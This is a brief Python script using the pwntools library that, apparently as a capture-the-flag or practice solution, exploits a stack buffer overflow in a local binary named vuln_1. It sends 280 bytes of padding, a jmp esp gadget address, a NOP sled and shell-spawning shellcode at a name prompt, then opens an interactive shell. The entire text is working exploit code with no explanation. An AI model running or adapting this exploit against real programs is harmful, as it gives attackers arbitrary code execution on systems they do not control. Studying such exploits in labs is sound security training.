from pwn import *

elf = context.binary = ELF('./vuln_1', checksec=False)
io = process()



shellcode = asm(shellcraft.sh())

rsp = 0x7fffffffd000
# ret = 0x0000000000401016
jmp_esp = 0x0000000000401154

payload = flat(
	b'A' * 280,
	jmp_esp,
	asm('nop') * 50,
	shellcode
)




io.sendafter(b"Hey, whats your name!?\n", payload)
io.sendafter(b"is this name correct? (y/n)?\n", b"y\n")

io.interactive()


